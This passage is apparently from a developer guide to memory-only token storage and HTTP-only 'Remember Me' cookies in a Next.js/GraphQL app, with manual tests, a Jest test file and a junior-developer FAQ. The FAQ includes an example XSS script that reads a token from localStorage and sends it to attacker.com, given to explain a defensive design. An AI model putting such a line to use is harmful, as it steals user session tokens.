❌ NOT logged in (redirected to login page)
✅ Session cookie deleted when browser closed
```

**Test 2: Login WITH Remember Me (Persistent Cookie)**
```bash
# Steps:
1. Open http://localhost:3000/auth/login
2. Enter credentials
3. CHECK "Remember me" checkbox
4. Click "Sign In"

# Expected Results:
✅ Login successful
✅ Redirected to dashboard
✅ DevTools → Application → Cookies shows:
   - refresh_token: "Expires" = ~30 days from now
   - client_fp: "Expires" = ~30 days from now
   - fp_hash: "Expires" = ~30 days from now
✅ Console shows: "🔐 Setting PERSISTENT cookies: 30 days"

# Test Persistence:
5. Close ALL browser windows
6. Reopen browser
7. Navigate to http://localhost:3000

# Expected:
✅ Still logged in (session restored)
✅ No redirect to login page
✅ Console shows: "✅ Session restored successfully"
```

**Test 3: Session Restoration (Page Refresh)**
```bash
# Steps:
1. Login successfully (with or without Remember Me)
2. Navigate to any protected page (e.g., dashboard)
3. Press F5 or Ctrl+R to refresh page

# Expected Results:
✅ Page reloads
✅ User stays logged in (no redirect)
✅ Console shows:
   - "🔍 Checking for existing session..."
   - "🔄 Refreshing access token..."
   - "✅ Token refresh successful"
   - "🔐 New access token stored in memory"
✅ DevTools → Network tab shows:
   - GraphQL request to /graphql/ (refreshToken mutation)
   - Request includes cookies (refresh_token sent automatically)
```

**Test 4: Logout Clears All Cookies**
```bash
# Steps:
1. Login successfully
2. Verify cookies exist in DevTools
3. Click logout button

# Expected Results:
✅ Redirected to login page
✅ Console shows:
   - "🚪 Starting logout process..."
   - "✅ Backend logout successful (cookies cleared by server)"
   - "🧹 Frontend state cleared"
✅ DevTools → Application → Cookies:
   - refresh_token: DELETED ✅
   - client_fp: DELETED ✅
   - fp_hash: DELETED ✅
✅ Try to access protected page:
   - Redirected to login (not authenticated)
```

**Test 5: Verify No Frontend Cookie Manipulation**
```bash
# Steps:
1. Open DevTools → Console
2. Login successfully
3. Check document.cookie

# Expected Results:
✅ document.cookie does NOT show:
   - auth-token (should NOT exist)
   - refresh_token (HTTP-only, invisible to JavaScript)
✅ document.cookie may show non-auth cookies:
   - Session tracking cookies (OK)
   - Analytics cookies (OK)
✅ NO authentication cookies visible to JavaScript
```

**Test 6: Token Expiry and Auto-Refresh**
```bash
# Steps:
1. Login successfully
2. Wait 4-5 minutes (access token expires in 5 min)
3. Make an API call (e.g., fetch user profile)

# Expected Results:
✅ First call fails with 401 (token expired)
✅ Frontend detects 401 error
✅ Frontend calls refreshToken() automatically
✅ New access token obtained
✅ Original API call retried with new token
✅ User doesn't notice interruption (seamless)

# Check Console:
- "🔄 Refreshing access token..."
- "✅ Token refresh successful"
- "🔐 New access token stored in memory"
```

---

### Automated Testing

**Test File**: Create `skillsync-fe/tests/auth-security.test.ts`

```typescript
import { render, screen, waitFor } from '@testing-library/react';
import { AuthProvider, useAuth } from '@/context/AuthContext';
import { act } from 'react-dom/test-utils';

describe('Authentication Security Tests', () => {
  
  test('Access token stored in memory only (not in localStorage)', async () => {
    // Setup
    const { result } = renderHook(() => useAuth(), {
      wrapper: AuthProvider,
    });
    
    // Login
    await act(async () => {
      await result.current.login('test@example.com', 'password', false);
    });
    
    // Verify access token in state
    expect(result.current.accessToken).toBeTruthy();
    
    // Verify NOT in localStorage
    expect(localStorage.getItem('accessToken')).toBeNull();
    expect(localStorage.getItem('access_token')).toBeNull();
    expect(localStorage.getItem('auth-token')).toBeNull();
    
    // Verify NOT in sessionStorage
    expect(sessionStorage.getItem('accessToken')).toBeNull();
    expect(sessionStorage.getItem('access_token')).toBeNull();
  });
  
  test('Frontend does NOT create auth cookies', async () => {
    const { result } = renderHook(() => useAuth(), {
      wrapper: AuthProvider,
    });
    
    // Spy on document.cookie setter
    const cookieSpy = jest.spyOn(document, 'cookie', 'set');
    
    // Login
    await act(async () => {
      await result.current.login('test@example.com', 'password', false);
    });
    
    // Verify document.cookie was NEVER set with auth tokens
    expect(cookieSpy).not.toHaveBeenCalledWith(
      expect.stringContaining('auth-token')
    );
    expect(cookieSpy).not.toHaveBeenCalledWith(
      expect.stringContaining('access_token')
    );
    expect(cookieSpy).not.toHaveBeenCalledWith(
      expect.stringContaining('refresh_token')
    );
    
    cookieSpy.mockRestore();
  });
  
  test('Session restoration calls backend refresh mutation', async () => {
    // Mock GraphQL client
    const mockRefresh = jest.fn().mockResolvedValue({
      success: true,
      accessToken: 'new-access-token',
      user: { id: 1, email: 'test@example.com' },
    });
    
    // Render with existing refresh token cookie (simulated)
    Object.defineProperty(window.document, 'cookie', {
      writable: true,
      value: 'refresh_token=mock-refresh-token; HttpOnly',
    });
    
    const { result } = renderHook(() => useAuth(), {
      wrapper: AuthProvider,
    });
    
    // Wait for session check
    await waitFor(() => {
      expect(mockRefresh).toHaveBeenCalled();
    });
    
    // Verify new access token in state
    expect(result.current.accessToken).toBe('new-access-token');
    expect(result.current.isAuthenticated).toBe(true);
  });
  
  test('Logout clears React state but NOT cookies (backend handles)', async () => {
    const { result } = renderHook(() => useAuth(), {
      wrapper: AuthProvider,
    });
    
    // Login first
    await act(async () => {
      await result.current.login('test@example.com', 'password', false);
    });
    
    expect(result.current.isAuthenticated).toBe(true);
    
    // Spy on document.cookie
    const cookieSpy = jest.spyOn(document, 'cookie', 'set');
    
    // Logout
    await act(async () => {
      await result.current.logout();
    });
    
    // Verify state cleared
    expect(result.current.accessToken).toBeNull();
    expect(result.current.isAuthenticated).toBe(false);
    
    // Verify frontend did NOT try to clear cookies
    expect(cookieSpy).not.toHaveBeenCalled();
    
    cookieSpy.mockRestore();
  });
  
  test('Remember Me flag passed to backend', async () => {
    const mockSignIn = jest.fn().mockResolvedValue({
      success: true,
      tokens: { accessToken: 'test-token' },
      user: { id: 1, email: 'test@example.com' },
    });
    
    const { result } = renderHook(() => useAuth(), {
      wrapper: AuthProvider,
    });
    
    // Login WITH Remember Me
    await act(async () => {
      await result.current.login('test@example.com', 'password', true);
    });
    
    // Verify backend called with rememberMe=true
    expect(mockSignIn).toHaveBeenCalledWith(
      'test@example.com',
      'password',
      true  // rememberMe flag
    );
  });
});
```

**Run Tests**:
```bash
cd skillsync-fe
npm test -- auth-security.test.ts
```

---

## 📚 Related Documentation

- **Backend Implementation Guide**: `skillsync-be/notes/remember_me_backend_implementation_guide.md`
- **Frontend Changelog**: `skillsync-fe/changelogs/Oct082025.md` (735 lines, complete Phase 1 & 2)
- **Backend Changelog**: `skillsync-be/changelogs/Oct082025.md` (514 lines, complete Phase 1 & 2)
- **Phase 1 & 2 Summary**: `PHASE_1_2_IMPLEMENTATION_COMPLETE.md`
- **Copilot Instructions**: `.github/copilot-instructions.md` (AI agent guide)

### External References

- **OWASP XSS Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **OWASP Authentication**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **HTTP Cookies (MDN)**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
- **React Security Best Practices**: https://react.dev/learn/security
- **Next.js Security**: https://nextjs.org/docs/app/building-your-application/configuring/security

---

## 👥 For Junior Developers

### Key Concepts Explained

**1. What is Memory-Only Storage?**
- **Simple explanation**: Data stored in RAM, deleted when page refreshes
- **Technical**: React `useState` stores data in JavaScript heap memory
- **Storage location**: Browser process memory (not disk)
- **Lifetime**: Until page refresh, tab close, or component unmount
- **Security**: Cannot be stolen via XSS that persists across sessions

**2. Why NOT use localStorage for Tokens?**
- **Simple explanation**: localStorage is like a public bulletin board - anyone can read it
- **Technical**: `localStorage.getItem()` accessible to ANY JavaScript on the page
- **Risk**: XSS attack can steal tokens and send to attacker's server
- **Example attack**:
  ```javascript
  // Malicious script injected via XSS
  const stolen = localStorage.getItem('accessToken');
  fetch('https://attacker.com/steal', { body: stolen });
  ```

**3. What are HTTP-Only Cookies?**
- **Simple explanation**: Cookies that JavaScript cannot read or write
- **Technical**: `HttpOnly` flag prevents `document.cookie` access
- **Set by**: Server via HTTP response headers (NOT JavaScript)
- **Read by**: Server only (browser sends automatically)
- **Security**: XSS attacks cannot steal HTTP-only cookies

**4. Why Session Cookies for Default?**
- **Simple explanation**: Safest option - deleted when browser closes
- **Technical**: Cookie with no `Max-Age` or `Expires` attribute
- **Use case**: Public computers, shared devices, cautious users
- **Security**: Even physical access to computer won't reveal token after browser closed

**5. How Does Session Restoration Work?**
- **Page refresh** → React state cleared → `accessToken = null`
- **Browser still has** → `refresh_token` cookie (HTTP-only, invisible to JavaScript)
- **Frontend calls** → `refreshToken()` mutation (no parameters)
- **Backend reads** → `refresh_token` from cookie (secure)
- **Backend generates** → NEW `accessToken`
- **Backend returns** → `accessToken` in response (NOT in cookie)
- **Frontend stores** → `accessToken` in React state (memory)
- **Session restored!** → User stays logged in

### Learning Resources

**Authentication & Security**:
- [OWASP Top 10 Security Risks](https://owasp.org/www-project-top-ten/)
- [How HTTP-Only Cookies Work (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [JWT Best Practices](https://curity.io/resources/learn/jwt-best-practices/)

**React & Next.js**:
- [React Context API (Official)](https://react.dev/learn/passing-data-deeply-with-context)
- [Next.js Authentication (Official)](https://nextjs.org/docs/pages/building-your-application/authentication)
- [React Security (Official)](https://react.dev/learn/security)

**GraphQL**:
- [GraphQL Authentication Patterns](https://www.apollographql.com/docs/react/networking/authentication/)
- [Apollo Client Docs](https://www.apollographql.com/docs/react/)

### Common Questions

**Q: Why can't I see refresh_token in document.cookie?**
**A**: It's HTTP-only! That's the whole point. HTTP-only cookies are invisible to JavaScript. Only the backend can read them. This protects against XSS attacks.

**Q: What happens if I refresh the page?**
**A**: React state is cleared (access token lost), but HTTP-only cookies remain. Frontend calls backend `refreshToken()` mutation to get a new access token. Backend reads HTTP-only refresh token cookie, generates new access token, returns it. Frontend stores new token in memory. Session restored seamlessly.

**Q: How do I debug authentication issues?**
**A**: 
1. Check browser DevTools → Application → Cookies (verify HTTP-only cookies exist)
2. Check browser DevTools → Console (look for 🔐 log messages)
3. Check browser DevTools → Network tab (verify GraphQL requests include cookies)
4. Check backend logs (verify refresh token validation, token rotation)

**Q: Can I access refresh_token from JavaScript?**
**A**: No! Never! That's the security feature. If you need to check if user is authenticated, check `authState.isAuthenticated` or call backend `me` query.

**Q: What if backend refresh call fails?**
**A**: Frontend clears state and redirects to login. User must re-authenticate. This is correct behavior (secure by default).

**Q: Why memory-only instead of sessionStorage?**
**A**: sessionStorage is still accessible to JavaScript (XSS vulnerability). Memory-only (React state) is not accessible via any JavaScript persistence API. Maximum security.

**Q: How long does access token last?**
**A**: 5 minutes. Short lifetime limits damage if stolen. Refresh token lasts 7-30 days (or session-only), but it's HTTP-only (cannot be stolen via XSS).

**Q: What if user closes browser tab (not entire browser)?**
**A**: 
- **Without Remember Me**: Session cookie persists until ALL browser windows closed
- **With Remember Me**: Persistent cookie survives tab/window close
- React state is cleared when tab closes, but cookies remain (session restored on reopen)

---

*Frontend Implementation Guide Created: October 8, 2025*  
*For: Memory-Only Authentication & Remember Me Integration*  
*Security Level: Enterprise-Grade (10/10)*
